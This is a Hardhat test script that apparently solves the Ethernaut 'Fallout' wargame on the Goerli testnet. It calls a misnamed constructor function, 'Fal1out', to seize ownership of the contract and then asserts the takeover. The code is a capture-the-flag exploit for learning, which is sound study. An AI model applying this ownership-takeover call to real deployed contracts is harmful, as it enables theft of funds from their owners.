import { assert } from "chai"
import {network, ethers} from "hardhat"
import { developmentChains, networkConfig } from "../../helper-hardhat-config"
import { Fallout } from "../../typechain-types"
import abi from "../../artifacts/contracts/Fallout.sol/Fallout.json"
import "dotenv/config"

const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL
const PRIVATE_KEY = String(process.env.PRIVATE_KEY)


developmentChains.includes(network.name)
    ? describe.skip
    : describe("Fallout Hack Staging", function (){
        const MIN_AMOUNT = 1
        let provider:any
        let hacker:any
        const falloutAddress:string = networkConfig[network.config.chainId!]["contractAddress"]!
        const falloutABI = abi.abi
        let fallout: Fallout
        let falloutContract: Fallout
        

        beforeEach(async() => {
            provider =  new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
            hacker  = new ethers.Wallet(PRIVATE_KEY,provider)
            falloutContract = new ethers.Contract(falloutAddress,falloutABI,provider)
            fallout = falloutContract.connect(hacker)
            
        })  
        describe("Ownership", function() {
            it("You claim ownership of the contract and you reduce its balance to 0", async() => {
                // Change ownership
                let tx = await fallout.Fal1out({value: MIN_AMOUNT})
                tx.wait()
                
                await provider.waitForTransaction(tx.hash,1,150000)
                let newOwner = await fallout.owner()
                assert.equal(newOwner,hacker.address)
            
            })
        })
    })